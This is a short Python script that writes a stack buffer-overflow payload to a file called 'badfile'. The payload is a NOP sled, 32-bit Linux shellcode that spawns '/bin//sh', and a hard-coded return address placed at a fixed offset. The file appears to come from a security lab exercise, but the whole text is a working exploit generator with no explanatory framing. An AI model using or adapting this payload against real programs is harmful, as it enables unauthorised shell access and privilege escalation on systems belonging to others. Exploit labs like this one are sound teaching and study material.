import sys

shellcode=(
"\xBB\xE5\x62\x55\x56\xFF\xD3"
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80").encode('latin-1')

length = 1014

content = bytearray(0x90 for i in range(length))

start = length - len(shellcode)

content[start:] = shellcode

ret = 0xffffb6e8 + 400
print(format(ret, '#x'))
content[666:670] = (ret).to_bytes(4, byteorder = 'little')

for i in range(len(content)):
	if (content[i] == 0x00):
		print('no', i, content[i])

with open('badfile', 'wb') as f:
	f.write(content)
